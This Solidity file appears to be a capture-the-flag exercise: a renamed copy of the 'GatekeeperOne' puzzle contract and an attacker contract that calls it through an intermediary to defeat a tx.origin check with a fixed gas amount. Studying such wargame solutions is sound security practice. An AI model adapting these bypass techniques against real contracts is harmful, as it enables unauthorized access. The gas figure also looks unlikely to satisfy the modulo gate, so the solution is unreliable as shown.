// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

contract DogGates {
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0, "GAS");
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract DogGatesBypass {
    DogGates public target;

    constructor(address _targetAddress) {
        target = DogGates(_targetAddress);
    }

    function bypass(bytes8 _gateKey) public {
        // Call the enter function through this contract to bypass gateOne
        require(target.enter{gas: 81910}(_gateKey), "Failed to pass all gates");
    }
}
